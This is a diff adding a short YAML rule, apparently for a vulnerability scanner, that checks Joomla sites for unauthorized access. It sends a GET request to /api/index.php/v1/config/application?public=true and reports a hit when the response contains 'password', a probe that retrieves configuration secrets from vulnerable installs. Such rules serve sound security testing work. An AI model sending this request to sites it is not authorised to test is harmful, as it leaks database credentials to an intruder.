@@ -1,0 +1,12 @@
+name: Find-Joomla-未授权访问
+rules:
+  - method: GET
+    poc: 
+        - /api/index.php/v1/config/application?public=true
+    body:
+
+    check: 'password'
+detail:
+  author: LittleBear4  
+  links: 
+    - https://xxxxxx
